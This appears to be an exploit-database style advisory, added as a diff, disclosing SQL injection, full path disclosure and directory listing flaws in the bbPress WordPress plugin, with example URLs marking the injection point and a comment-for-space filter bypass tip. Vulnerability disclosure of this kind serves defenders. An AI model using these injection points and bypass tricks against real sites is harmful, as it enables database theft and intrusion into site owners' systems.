@@ -1,0 +1,48 @@
+# Souhail Hammou - Independant Security Researcher & Penetration Tester .
+# Facebook : www.facebook.com/dark.puzzle.sec
+# Website : www.dark-puzzle.com
+# Youtube : http://www.youtube.com/user/mariotrey
+# E-mail   : dark-puzzle@live.fr
+# Greetings to all moroccan researchers and white hats .
+====================================================
+# Exploit Title: Wordpress plugins - bbpress Multiple Vulnerabilities
+# Author: Dark-Puzzle (Souhail Hammou)
+# OSVDB ID : 86400 & 86399 .
+# Vendor Website : www.bbpress.ru  /  www.bbpress.com
+# Risk : Critical
+# Version: All Versions
+# Google Dork : N/A
+# Category: Webapps/0day
+# Tested on: Windows Xp Sp2 , Backtrack 5 R3 .
+----------------------------------------------------
+I - SQL Injection Vulnerability :
+----------------------------------------------------
+bbpress plugin is prone to an SQL injection Vulnerability .
+In cases when you face a valid string column problem try to change syntax or instead spaces add /**/ .
+
+Note: Automated injection can be more effective in this case.
+
+Example : 
+
+http://www.example.com/wp-content/plugins/bbpress/forum.php?id=1&page=[Inject here] 
+
+---------------------------------------------------
+II - Full Path Disclosure Vulnerability :
+---------------------------------------------------
+
+The Full Path Disclosure vulnerability in bbpress is via Array .
+
+Example :
+
+www.example.com/path/bbpress/topic.php?id[]=12&replies=3
+
+Error : Warning: urlencode() expects parameter 1 to be string, array given in /Full/Path/Here on line 786
+
+---------------------------------------------------
+III - Directory Listing Vulnerability :
+---------------------------------------------------
+
+www.example.com/PATH/bbpress/bb-templates/kakumei/
+www.example.com/PATH/bbpress/bb-templates/kakumei-blue/
+
+#Dark-Puzzle
